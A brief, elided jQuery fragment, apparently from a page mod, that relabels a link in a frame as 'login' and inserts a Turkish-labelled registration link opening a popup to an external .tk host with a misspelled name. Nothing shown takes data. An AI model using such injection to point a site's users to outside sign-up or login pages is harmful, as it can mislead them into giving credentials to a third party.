...
function modding(){
	...
	$("a[href='JavaScript:p_open();']",cf.document).html('login');
	 $('<a href="#" onclick="window.open(\'http://regiser.ikiadamcbox.tk/register.php\', \'\', \'width=400, height=300\'); return false">kay�t</a>').insertAfter($("a[href='JavaScript:p_open();']", cf.document));
